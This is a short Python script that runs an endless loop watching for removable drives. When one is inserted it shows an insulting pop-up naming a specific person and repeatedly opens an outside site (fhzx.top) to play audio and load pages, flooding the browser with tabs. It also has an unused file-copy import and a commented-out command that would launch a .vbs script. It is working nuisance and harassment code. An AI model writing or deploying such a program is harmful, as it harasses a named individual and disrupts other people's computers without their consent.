# -*- coding: utf-8 -*-
from time import sleep
from shutil import copytree
from psutil import disk_partitions
from tkinter import messagebox
import webbrowser
import os

a=0
t=0

while a==0:
    sleep(1)
    for item in disk_partitions():
        if 'removable' in item.opts:
            messagebox.showwarning(title="垃圾张艺腾",message="我要吃你")
            #os.system("start D:\\HugoMoveData\\User\\seewo\\Downloads\\install\\a.vbs B MIN")
            if t==0:
                for i in range(4):
                    webbrowser.open("fhzx.top/laji/a.mp3")
                t=1
            webbrowser.open("fhzx.top/laji")


